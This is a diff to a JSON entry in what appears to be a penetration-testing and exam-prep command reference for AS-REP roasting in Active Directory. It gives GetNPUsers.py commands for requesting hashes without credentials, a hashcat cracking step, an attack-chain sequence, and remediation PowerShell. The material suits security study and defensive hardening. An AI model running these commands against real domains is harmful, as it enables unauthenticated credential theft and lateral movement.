@@ -2,7 +2,7 @@
   "id": "ad-getnpusers",
   "name": "GetNPUsers.py - AS-REP Roasting (Linux)",
   "command": "GetNPUsers.py <domain>/ -dc-ip <dc_ip> -no-pass -usersfile <userlist>",
-  "description": "Requests AS-REP tickets for accounts with Kerberos pre-authentication disabled (UF_DONT_REQUIRE_PREAUTH). The DC encrypts the AS-REP with the account's NT hash \u2014 recoverable offline. No credentials needed if using -no-pass with a user list. Hash output in $krb5asrep$23$ format for Hashcat mode 18200.",
+  "description": "Requests AS-REP tickets for accounts with Kerberos pre-authentication disabled (UF_DONT_REQUIRE_PREAUTH). The DC encrypts the AS-REP with the account's NT hash — recoverable offline. No credentials needed if using -no-pass with a user list. Hash output in $krb5asrep$23$ format for Hashcat mode 18200.",
   "platform": "linux",
   "type": "command",
   "opsec": "moderate",
@@ -26,7 +26,7 @@
     "T1558.004"
   ],
   "exam": "exam-ok",
-  "notes": "=== WHY AS-REP ROASTING WORKS ===\nKerberos pre-authentication is the default security mechanism: when a user requests\na TGT, they must first prove knowledge of their password by encrypting a timestamp\nwith their NT hash. This prevents offline cracking of the TGT.\n\nWhen 'Do not require Kerberos preauthentication' (UF_DONT_REQUIRE_PREAUTH) is set\non an account, the DC skips this step and returns an AS-REP encrypted with the\naccount's NT hash \u2014 TO ANYONE WHO ASKS, WITHOUT ANY CREDENTIALS.\n\nThis means:\n  1. No valid domain credentials required to attack\n  2. Request AS-REP for any vulnerable account from any machine\n  3. Hash the DC returned is encrypted with the target's password-derived key\n  4. Crack offline \u2014 no lockout, no noise from repeated attempts\n\n=== WHEN TO USE -no-pass vs WITH CREDS ===\n  -no-pass -usersfile users.txt \u2192 anonymous/no-auth attack: tries each user,\n    DC returns AS-REP if pre-auth is disabled. Requires you have a user list.\n  -u user -p pass (authenticated) \u2192 can also enumerate which accounts are\n    vulnerable AND request their AS-REPs in one shot.\n\n=== OUTPUT TO LOOK FOR ===\n  $krb5asrep$23$user@DOMAIN:...  \u2192 vulnerable account, hash ready for cracking\n  Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN \u2192 user doesn't exist\n  Kerberos SessionError: KDC_ERR_PREAUTH_REQUIRED \u2192 pre-auth IS enabled (not vulnerable)\n\n=== HASH FORMAT ===\n$krb5asrep$23$... \u2192 etype 23 (RC4), Hashcat mode 18200\n$krb5asrep$18$... \u2192 etype 18 (AES256), Hashcat mode 18200 still, but much slower to crack\n\n=== AUTHENTICATED ENUMERATION FIRST ===\nIf you have creds, find vulnerable accounts first with PowerView:\n  Get-DomainUser -PreauthNotRequired | select samaccountname\nThen target GetNPUsers.py against those specific accounts.\n\n=== CHAIN POSITION ===\nThis attack requires NO credentials \u2014 ideal for initial access.\nSuccessful crack \u2192 password for the account \u2192 same spray/lateral movement paths\nas any other cracked password. Also covered in: OSCP PEN-200 Chapter 22 (Attacking Active Directory Authentication).",
+  "notes": "=== WHY AS-REP ROASTING WORKS ===\nKerberos pre-authentication is the default security mechanism: when a user requests\na TGT, they must first prove knowledge of their password by encrypting a timestamp\nwith their NT hash. This prevents offline cracking of the TGT.\n\nWhen 'Do not require Kerberos preauthentication' (UF_DONT_REQUIRE_PREAUTH) is set\non an account, the DC skips this step and returns an AS-REP encrypted with the\naccount's NT hash — TO ANYONE WHO ASKS, WITHOUT ANY CREDENTIALS.\n\nThis means:\n  1. No valid domain credentials required to attack\n  2. Request AS-REP for any vulnerable account from any machine\n  3. Hash the DC returned is encrypted with the target's password-derived key\n  4. Crack offline — no lockout, no noise from repeated attempts\n\n=== WHEN TO USE -no-pass vs WITH CREDS ===\n  -no-pass -usersfile users.txt → anonymous/no-auth attack: tries each user,\n    DC returns AS-REP if pre-auth is disabled. Requires you have a user list.\n  -u user -p pass (authenticated) → can also enumerate which accounts are\n    vulnerable AND request their AS-REPs in one shot.\n\n=== OUTPUT TO LOOK FOR ===\n  $krb5asrep$23$user@DOMAIN:...  → vulnerable account, hash ready for cracking\n  Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN → user doesn't exist\n  Kerberos SessionError: KDC_ERR_PREAUTH_REQUIRED → pre-auth IS enabled (not vulnerable)\n\n=== HASH FORMAT ===\n$krb5asrep$23$... → etype 23 (RC4), Hashcat mode 18200\n$krb5asrep$18$... → etype 18 (AES256), Hashcat mode 18200 still, but much slower to crack\n\n=== AUTHENTICATED ENUMERATION FIRST ===\nIf you have creds, find vulnerable accounts first with PowerView:\n  Get-DomainUser -PreauthNotRequired | select samaccountname\nThen target GetNPUsers.py against those specific accounts.\n\n=== CHAIN POSITION ===\nThis attack requires NO credentials — ideal for initial access.\nSuccessful crack → password for the account → same spray/lateral movement paths\nas any other cracked password. Also covered in: OSCP PEN-200 Chapter 22 (Attacking Active Directory Authentication).\n\n=== CLOCK SKEW (KRB_AP_ERR_SKEW) ===\nKerberos from Linux fails if your host clock differs from the DC by >5 min:\n  'Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)'.\nFix before impacket/Rubeus runs:\n  sudo timedatectl set-ntp off; sudo ntpdate <dc_ip>   # or: sudo rdate -n <dc_ip>",
   "examples": [
     {
       "label": "No-creds spray against user list",
@@ -41,7 +41,7 @@
       "command": "GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile users.txt -outputfile asrep_hashes.txt"
     },
     {
-      "label": "Ch22 \u2014 authenticated request, save hash for cracking (PEN-200 lab pattern)",
+      "label": "Ch22 — authenticated request, save hash for cracking (PEN-200 lab pattern)",
       "command": "impacket-GetNPUsers -dc-ip <dc_ip> -request -outputfile hashes.asreproast <domain>/<user>"
     }
   ],
@@ -78,11 +78,35 @@
       "HTB M13",
       "MITRE T1558.004"
     ],
-    "misconfiguration": "The 'Do Not Require Kerberos Preauthentication' checkbox is enabled on the user account (msDS-SupportedEncryptionTypes or the UAC flag UF_DONT_REQUIRE_PREAUTH = 0x400000). This means the KDC issues an AS-REP with the user's session key encrypted by their password hash \u2014 without demanding proof of identity first.",
+    "misconfiguration": "The 'Do Not Require Kerberos Preauthentication' checkbox is enabled on the user account (msDS-SupportedEncryptionTypes or the UAC flag UF_DONT_REQUIRE_PREAUTH = 0x400000). This means the KDC issues an AS-REP with the user's session key encrypted by their password hash — without demanding proof of identity first.",
     "vulnerable_config": "# Active Directory user account attribute (via ADUC or ADSI Edit)\n# 'Do not require Kerberos preauthentication' = CHECKED\n# In PowerShell:\nSet-ADAccountControl -Identity svc_backup -DoesNotRequirePreAuth $true\n\n# UAC flag value: 0x400000 (4194304)\n# Confirmed with:\nGet-ADUser svc_backup -Properties DoesNotRequirePreAuth",
-    "secure_config": "# Enforce Kerberos pre-authentication (the secure default)\n# In PowerShell:\nSet-ADAccountControl -Identity svc_backup -DoesNotRequirePreAuth $false\n\n# Bulk fix \u2014 find and fix all no-preauth accounts:\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth |\n  Set-ADAccountControl -DoesNotRequirePreAuth $false\n\n# GPO path (Kerberos policy):\n# Computer Configuration > Windows Settings > Security Settings >\n# Account Policies > Kerberos Policy\n# 'Maximum lifetime for user ticket' should be set (forces preauth implicitly)"
+    "secure_config": "# Enforce Kerberos pre-authentication (the secure default)\n# In PowerShell:\nSet-ADAccountControl -Identity svc_backup -DoesNotRequirePreAuth $false\n\n# Bulk fix — find and fix all no-preauth accounts:\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth |\n  Set-ADAccountControl -DoesNotRequirePreAuth $false\n\n# GPO path (Kerberos policy):\n# Computer Configuration > Windows Settings > Security Settings >\n# Account Policies > Kerberos Policy\n# 'Maximum lifetime for user ticket' should be set (forces preauth implicitly)"
   },
   "tools": [
     "impacket"
+  ],
+  "variations": [
+    {
+      "label": "Authenticated (enumerate + roast)",
+      "command": "GetNPUsers.py <domain>/<user>:<password> -dc-ip <dc_ip> -request -format hashcat -outputfile asrep.txt"
+    },
+    {
+      "label": "Single user, no creds",
+      "command": "GetNPUsers.py <domain>/<target_user> -dc-ip <dc_ip> -no-pass -format hashcat"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Roast users without pre-auth",
+      "command": "GetNPUsers.py <domain>/ -dc-ip <dc_ip> -no-pass -usersfile <userlist> -format hashcat -outputfile asrep.txt"
+    },
+    {
+      "label": "Crack offline (hashcat 18200)",
+      "command": "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
+    },
+    {
+      "label": "Authenticate as the cracked user",
+      "command": "# re-enumerate from the new user's perspective"
+    }
   ]
 }
